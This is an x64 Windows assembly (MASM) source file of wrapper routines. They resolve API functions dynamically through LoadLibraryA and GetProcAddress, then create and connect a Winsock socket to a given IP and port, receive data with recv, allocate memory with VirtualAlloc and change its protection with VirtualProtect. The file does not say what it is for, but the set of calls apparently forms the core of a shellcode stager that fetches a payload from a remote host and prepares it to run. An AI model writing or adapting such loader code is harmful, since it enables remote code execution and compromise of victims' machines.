.DATA

.CODE

ALIGN 16

;HMODULE LoadLibraryA(
;  [in] LPCSTR lpLibFileName -> RCX
;);

EXTERN __imp_LoadLibraryA : QWORD

asmLoadLibrary PROC
	sub rsp, 28h

	call [__imp_LoadLibraryA]

	add rsp, 28h
	ret
asmLoadLibrary ENDP

;FARPROC GetProcAddress(
;  [in] HMODULE hModule,	-> RCX
;  [in] LPCSTR  lpProcName  -> RDX
;);

EXTERN __imp_GetProcAddress : QWORD

asmGetProcAddress PROC
	sub rsp, 28h

	call [__imp_GetProcAddress]

	add rsp, 28h
	ret
asmGetProcAddress ENDP

;int WSAStartup(
;  [in]  WORD      wVersionRequired, -> RCX
;  [out] LPWSADATA lpWSAData		 -> RDX
;);

asmWSAStartup PROC
	sub rsp, 28h

	mov rax, r8
	call rax

	add rsp, 28h
	ret
asmWSAStartup ENDP

;SOCKET WSAAPI WSASocketA(
;  [in] int                 af,				-> RCX
;  [in] int                 type,			-> RDX
;  [in] int                 protocol,		-> R8
;  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo, -> R9
;  [in] GROUP               g,
;  [in] DWORD               dwFlags
;);

asmWSASocketA PROC
	sub rsp, 38h
	
	mov rax, rcx

	xor rcx, rcx
	mov [rsp+20h], rcx
	mov [rsp+28h], rcx
	xor r8, r8
	xor r9, r9
	inc rcx
	mov rdx, rcx
	inc rcx
	
	call rax

	add rsp, 38h
	ret
asmWSASocketA ENDP

;int WSAAPI WSAConnect(
;  [in]  SOCKET         s,				-> RCX
;  [in]  const sockaddr *name,			-> RDX
;  [in]  int            namelen,		-> R8
;  [in]  LPWSABUF       lpCallerData,	-> R9
;  [out] LPWSABUF       lpCalleeData,	-> [rsp+20h]
;  [in]  LPQOS          lpSQOS,			-> [rsp+28h]
;  [in]  LPQOS          lpGQOS			-> [rsp+30h]
;);

EXTERN convertIpToLong : PROC

asmConnect PROC
	sub rsp, 28h
	
	mov r14, rcx
	mov rcx, rdx

	call convertIpToLong

	xor rdx, rdx
	; AF_INET = 2
	mov dl, 2
	mov [rsp], rdx

	xor rdx, rdx
	; change port number from big- to a little-endian format
	ror r8w, 8 
	mov dx, r8w 
	mov [rsp+2], rdx

	; rax - IP hash from convertIpToLong is already in a little-endian format
	mov edx, eax
	mov [rsp+4], rdx

	; current rsp address is now containing full sockaddr
	lea rdx, [rsp]

	xor r8, r8
	mov r8b, 16h

	mov rcx, r14

	sub rsp, 38h

	mov rax, r9
	xor r9, r9
	mov [rsp+20h], r9
	mov [rsp+28h], r9
	mov [rsp+30h], r9

	call rax

	add rsp, 38h

	add rsp, 28h
	ret
asmConnect ENDP

;int WSAAPI recv(
;  [in]  SOCKET s,		-> RCX
;  [out] char   *buf,	-> RDX
;  [in]  int    len,	-> R8
;  [in]  int    flags	-> R9
;);

asmRecv PROC
	sub rsp, 28h

	mov rax, r9

	xor r9, r9
	
	call rax

	add rsp, 28h
	ret
asmRecv ENDP

;LPVOID VirtualAlloc(
;  [in, optional] LPVOID lpAddress,			-> RCX
;  [in]           SIZE_T dwSize,			-> RDX
;  [in]           DWORD  flAllocationType,	-> R8
;  [in]           DWORD  flProtect			-> R9
;);

asmVirtualAlloc PROC
	sub rsp, 28h

	mov rax, rcx
	xor rcx, rcx

	call rax

	add rsp, 28h
	ret
asmVirtualAlloc ENDP

;BOOL VirtualProtect(
;  [in]  LPVOID lpAddress,		-> RCX
;  [in]  SIZE_T dwSize,			-> RDX
;  [in]  DWORD  flNewProtect,	-> R8
;  [out] PDWORD lpflOldProtect	-> R9
;);

asmVirtualProtect PROC
	sub rsp, 28h

	mov rax, r9
	xor r9, r9

	sub rsp, 10h
	mov r9, rsp

	call rax

	add rsp, 38h
	ret
asmVirtualProtect ENDP

END